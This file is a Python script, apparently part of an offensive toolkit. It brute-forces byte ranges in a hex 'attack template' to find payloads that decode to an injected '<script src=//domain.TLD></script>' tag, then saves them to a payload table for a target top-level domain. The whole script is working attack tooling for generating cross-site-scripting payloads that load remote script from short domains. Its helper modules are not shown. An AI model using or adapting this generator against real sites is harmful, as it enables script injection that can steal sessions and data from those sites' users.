#!/usr/bin/env python3
from utils import *
import sys
'''
Once you have used tld_tool.py to determine a good attack template -
add the template to utils.py domain_teomplate_table then use this script 
to populate a payload table for the target tld
'''
if __name__ == "__main__":
    '''
    # 3x2 - ***.BZ attack template
    template = "f399281922111510691928276e6e{}1e581b1f576e69b16375535b6f0e7f"
    target_tld = 'BZ'
    attack = Attack(template, 0x6e1111, 0x6effff)
    '''

    #''' Target specific domain
    target_tld = sys.argv[1].upper() # ie: BZ, PE
    dtt = domain_template_table[target_tld] # via utils.py
    template = dtt[0]
    attack = Attack(dtt[0], dtt[1], dtt[2], poolSz=8)
    brange = attack.range
    pt = PayloadTable(target_tld)
    #'''

    pattern = (".*\<script src=//([A-Z0-9\-]{3,6}\.\w{%s})\>\</script\>" % len(target_tld)).encode()
    pattern = re.compile(pattern, re.IGNORECASE)
    print('[+] Generating payload tables for TLD: .%s' % target_tld)
    #for result in attack.pool.imap_unordered(attack.f, range(attack.start, attack.end + 1), 1000):
    for result in attack.pool.imap_unordered(work, gen(attack.start, attack.end + 1, attack.template, attack.range), 1000):
        m = re.match(pattern, result[0])
        #m = re.match(rb".*//([A-Z0-9\-]{3,6}\.\w{2})", result[0])
        if m is not None:
            domain = m.group(1).decode()
            payload = result[1]
            pt.insert(domain.split(".")[0], template, payload, save=False)
            print("Found new payload: {},{}".format(domain, payload))

    attack.pool.close()
    attack.pool.join()
    pt.save() # save results at the end - avoid file write races
    print('[+] DONE - results saved')
